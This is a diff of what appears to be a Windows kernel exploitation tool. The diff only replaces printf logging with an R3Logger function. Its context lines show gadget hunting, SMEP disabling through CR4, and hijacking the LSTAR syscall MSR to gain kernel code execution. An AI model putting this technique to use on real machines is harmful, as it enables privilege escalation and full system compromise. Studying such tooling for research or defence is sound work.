@@ -21,11 +21,11 @@ namespace vdm
 	{
 		if (!m_mov_cr4_gadget || !m_sysret_gadget || !m_pop_rcx_gadget)
 			if (!find_gadgets())
-				std::printf("[-] failed to find gadgets...\n");
+				R3Logger("[-] failed to find gadgets...\n");
 
 		if (!m_kpcr_rsp_offset || !m_kpcr_krsp_offset || !m_system_call)
 			if (!find_globals())
-				std::printf("[-] failed to find globals...\n");
+				R3Logger("[-] failed to find globals...\n");
 
 		// guess CR4 value for now... 
 		// later on I get real cr4 value from IPI...
@@ -44,20 +44,20 @@ namespace vdm
 				utils::kmodule::get_export(
 					"ntoskrnl.exe", "RtlFindExportedRoutineByName"));
 
-		std::printf("[*] m_pop_rcx_gadget -> 0x%p\n", m_pop_rcx_gadget);
-		std::printf("[*] m_mov_cr4_gadget -> 0x%p\n", m_mov_cr4_gadget);
-		std::printf("[*] m_sysret_gadget -> 0x%p\n", m_sysret_gadget);
-		std::printf("[*] m_kpcr_rsp_offset -> 0x%x\n", m_kpcr_rsp_offset);
-		std::printf("[*] m_kpcr_krsp_offset -> 0x%x\n", m_kpcr_krsp_offset);
-		std::printf("[*] m_system_call -> 0x%p\n", m_system_call);
-		std::printf("[*] m_smep_off -> 0x%p\n", m_smep_off.flags);
-		std::printf("[*] m_smep_on -> 0x%p\n", m_smep_on.flags);
+		R3Logger("[*] m_pop_rcx_gadget -> 0x%p\n", m_pop_rcx_gadget);
+		R3Logger("[*] m_mov_cr4_gadget -> 0x%p\n", m_mov_cr4_gadget);
+		R3Logger("[*] m_sysret_gadget -> 0x%p\n", m_sysret_gadget);
+		R3Logger("[*] m_kpcr_rsp_offset -> 0x%x\n", m_kpcr_rsp_offset);
+		R3Logger("[*] m_kpcr_krsp_offset -> 0x%x\n", m_kpcr_krsp_offset);
+		R3Logger("[*] m_system_call -> 0x%p\n", m_system_call);
+		R3Logger("[*] m_smep_off -> 0x%p\n", m_smep_off.flags);
+		R3Logger("[*] m_smep_on -> 0x%p\n", m_smep_on.flags);
 
 		if (has_zero(m_pop_rcx_gadget, m_mov_cr4_gadget, m_sysret_gadget,
 			m_kpcr_rsp_offset, m_kpcr_krsp_offset, m_system_call))
 		{
 			success = false;
-			std::printf("[-] failed to find all gadgets/globals...\n");
+			R3Logger("[-] failed to find all gadgets/globals...\n");
 			return;
 		}
 		else {
@@ -259,7 +259,7 @@ namespace vdm
 
 		// set LSTAR to first rop gadget... race begins here...
 		if (!wrmsr(IA32_LSTAR_MSR, m_pop_rcx_gadget))
-			printf("[-] failed to set LSTAR...\n");
+			R3Logger("[-] failed to set LSTAR...\n");
 		else
 			// go go gadget kernel execution...
 			syscall_wrapper(&kernel_callback);
